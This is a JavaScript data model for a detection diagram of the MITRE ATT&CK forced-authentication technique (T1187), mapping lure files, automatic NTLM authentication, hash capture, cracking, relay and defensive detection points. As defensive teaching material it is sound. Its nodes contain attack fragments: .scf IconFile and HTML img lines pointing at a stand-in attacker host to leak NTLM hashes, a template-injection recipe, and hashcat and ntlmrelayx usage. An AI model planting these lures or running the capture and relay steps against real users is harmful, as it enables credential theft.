// T1187 — Forced Authentication — Detection Data Model
// Tactic: Credential Access

const model = {
  metadata: {
    tcode: "T1187",
    name: "Forced Authentication",
    tactic: "Credential Access",
    platform: "Windows",
    version: "v1.0",
  },

  detectNodeId: "ev_detect",

  layout: {
    svgWidth: 960,
    svgHeight: 500,
    columns: [
      { label: "LURE DELIVERY",x: 80  },
      { label: "AUTO-AUTH",    x: 270 },
      { label: "CAPTURE",     x: 470 },
      { label: "DETECTION",   x: 670 },
      { label: "OUTCOME",     x: 880 },
    ],
    separators: [175, 370, 570, 775],
    annotations: [
      { text: "Windows auto-authenticates outbound SMB/WebDAV", x: 270, y: 440, color: "#c62828", fontStyle: "italic" },
    ],
  },

  nodes: [
    { id: "scf_file", label: ".scf / .url", sub: "Icon UNC path", x: 80, y: 100, r: 34, type: "source",
      tags: [".scf file", ".url file", "IconFile=\\\\attacker\\icon", "Auto-load in Explorer"],
      telemetry: ["Sysmon 11"],
      api: ".scf file with IconFile=\\\\attacker\\share\\icon.ico — auto-loads when folder is browsed",
      artifact: "Sysmon EID 11: .scf/.url file creation · UNC path in file content",
      desc: "Windows Shell Command Files (.scf) and .url files can specify an icon path via UNC (IconFile=\\\\attacker\\share\\icon.ico). When a user browses the folder containing the file, Explorer automatically resolves the UNC path, triggering NTLM authentication to the attacker's server. No click needed — just opening the folder.",
      src: "MITRE ATT&CK T1187; Farmer_Hash_collection" },

    { id: "doc_unc", label: "Office Doc", sub: "UNC in template", x: 80, y: 250, r: 34, type: "source",
      tags: ["docx template injection", "OLE link", "\\\\attacker\\template.dotx"],
      telemetry: ["Sysmon 1"],
      api: "Word/Excel document with template URL pointing to \\\\attacker\\share\\template.dotx",
      artifact: "Office process connecting to external UNC · document with embedded UNC path",
      desc: "Office documents can reference remote templates, OLE objects, or images via UNC paths. When the document is opened, Office automatically resolves the UNC path, sending the user's NTLM credentials. Template injection: modify word/_rels/settings.xml.rels to point to \\\\attacker\\template.",
      src: "MITRE T1187; Template injection technique" },

    { id: "html_img", label: "HTML/Email", sub: "img src=file://", x: 80, y: 400, r: 34, type: "source",
      tags: ["HTML img", "file:// or \\\\", "Email image", "Internal page"],
      telemetry: [],
      api: "<img src='file://attacker/share/pixel.png'> or <img src='\\\\attacker\\pixel.png'>",
      artifact: "HTML with file:// or UNC image reference · email with external image",
      desc: "HTML content (emails, internal web pages, OneNote) can include images referencing UNC paths or file:// URLs. Some email clients and browsers resolve these automatically, sending NTLM credentials. Outlook is particularly vulnerable to this via email preview.",
      src: "MITRE T1187" },

    { id: "auto_ntlm", label: "Auto NTLM", sub: "SMB/WebDAV", x: 270, y: 250, r: 40, type: "source",
      tags: ["Automatic NTLM", "SMB outbound", "WebDAV fallback", "No user action"],
      telemetry: ["Sysmon 3"],
      api: "Windows automatically sends NTLM credentials when resolving UNC paths — SMB or WebDAV",
      artifact: "Outbound SMB (TCP/445) or WebDAV (TCP/80/443) to external IP · auto-auth",
      desc: "Windows automatically attempts NTLM authentication when resolving UNC paths. First tries SMB (TCP/445), then falls back to WebDAV (TCP/80/443). This is by design for file sharing but is exploitable — the user's NTLMv2 credentials are sent without any prompt or interaction.",
      src: "MITRE T1187; Microsoft UNC hardened paths" },

    { id: "responder_cap", label: "Responder", sub: "Hash Capture", x: 470, y: 250, r: 38, type: "source",
      tags: ["Responder SMB server", "ntlmrelayx", "Net-NTLMv2 capture"],
      telemetry: [],
      api: "Responder's SMB server captures NTLMv2 challenge-response from forced auth",
      artifact: "Net-NTLMv2 hash in Responder logs · capturable and crackable/relayable",
      desc: "The attacker runs Responder or a custom SMB/WebDAV server to capture the forced NTLM authentication. The Net-NTLMv2 challenge-response hash is logged. Can be cracked offline (hashcat -m 5600) or relayed in real-time via ntlmrelayx to another target.",
      src: "SpiderLabs/Responder; Impacket ntlmrelayx" },

    { id: "ev_detect", label: "Outbound SMB", sub: "Firewall + Sysmon", x: 670, y: 250, r: 50, type: "detect",
      tags: ["Outbound SMB 445", "Sysmon 3", "Firewall block", "UNC in files"],
      telemetry: ["Sysmon 3", "Firewall"],
      api: "Block outbound SMB (445) at perimeter + alert on outbound NTLM to external IPs",
      artifact: "OPTIMAL: Block outbound TCP/445 at firewall · Sysmon 3 outbound SMB · UNC content scan",
      desc: "OPTIMAL DETECTION NODE. (1) FIREWALL: Block outbound SMB (TCP/445) at the network perimeter — this prevents hash exfiltration entirely. (2) Sysmon EID 3: outbound connections to TCP/445 from Office/Explorer processes to external IPs. (3) Content scanning: detect .scf/.url/.docx files containing external UNC paths. (4) GPO: Restrict NTLM to specific servers via 'Restrict NTLM: Outgoing NTLM traffic' policy.",
      src: "MITRE T1187; Microsoft NTLM restriction GPO; CIS firewall recommendations" },

    { id: "crack", label: "Offline Crack", sub: "hashcat -m 5600", x: 880, y: 170, r: 36, type: "blind",
      tags: ["hashcat -m 5600", "Net-NTLMv2", "Offline"],
      telemetry: [],
      api: "hashcat -m 5600 — cracks captured Net-NTLMv2 hashes offline",
      artifact: "⚠ BLIND — offline cracking on attacker infrastructure",
      desc: "BLIND SPOT. Captured Net-NTLMv2 hashes are cracked offline. Yields plaintext domain credentials without ever interacting with the target network again.",
      src: "hashcat" },

    { id: "relay", label: "NTLM Relay", sub: "Real-time", x: 880, y: 340, r: 36, type: "source",
      tags: ["ntlmrelayx", "Real-time relay", "No cracking needed"],
      telemetry: ["4624"],
      api: "ntlmrelayx relays captured auth to another target in real-time",
      artifact: "Event 4624 on relay target from unexpected source · no password cracking needed",
      desc: "Instead of cracking, the attacker relays the forced NTLM authentication in real-time to another target. If SMB signing is not enforced (workstation default), the attacker authenticates as the victim. Yields immediate access without needing to crack the password.",
      src: "Impacket ntlmrelayx; MITRE T1187" },
  ],

  edges: [
    { f: "scf_file", t: "auto_ntlm" },
    { f: "doc_unc", t: "auto_ntlm" },
    { f: "html_img", t: "auto_ntlm" },
    { f: "auto_ntlm", t: "responder_cap" },
    { f: "auto_ntlm", t: "ev_detect" },
    { f: "responder_cap", t: "crack" },
    { f: "responder_cap", t: "relay" },
    { f: "ev_detect", t: "crack" },
    { f: "ev_detect", t: "relay" },
  ],
};

export default model;
